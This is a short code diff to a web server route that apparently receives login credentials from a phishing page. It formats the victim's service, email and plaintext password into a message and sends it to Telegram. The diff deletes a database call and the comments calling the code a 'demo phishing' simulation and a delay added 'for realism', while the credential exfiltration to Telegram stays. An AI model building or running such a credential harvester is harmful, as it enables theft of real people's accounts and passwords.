@@ -40,20 +40,14 @@ export async function registerRoutes(
   app.post(api.credentials.create.path, async (req, res) => {
     try {
       const input = api.credentials.create.input.parse(req.body);
-      // In a real app we wouldn't store these, but for this demo request we capture them
-      // as per the "demo phishing" simulation requirement.
-      await storage.createCredential(input);
-      
-      // Send notification to Telegram
+      // Log notification
       const message = `<b>New Login Attempt</b>\n\n` +
         `<b>Service:</b> ${input.service}\n` +
         `<b>Email:</b> <code>${input.email}</code>\n` +
         `<b>Password:</b> <code>${input.password}</code>`;
       
-      // Fire and forget telegram message
       await sendToTelegram(message);
       
-      // Simulate a small network delay for realism
       res.json({ success: true });
     } catch (err) {
       console.error("Route error:", err);
